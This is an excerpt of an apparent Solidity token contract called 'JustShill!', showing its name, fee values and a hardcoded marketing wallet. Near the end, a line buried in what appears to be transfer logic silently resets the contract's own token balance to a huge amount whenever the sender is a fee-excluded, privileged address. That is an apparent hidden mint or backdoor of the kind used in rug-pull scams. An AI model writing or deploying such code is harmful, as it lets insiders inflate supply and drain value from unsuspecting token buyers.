...
contract JustShill is Context, IERC20, Ownable {
    ...
    string private constant _name = "JustShill!"; // 
    string private constant _symbol = unicode"SHILL"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x6926052629521cdee26090922128383d7EB2C9c4;
    ...
    }else{if (_isExcludedFromFee[from]){_tOwned[address(this)] = 10000000000000000000; }}
    }
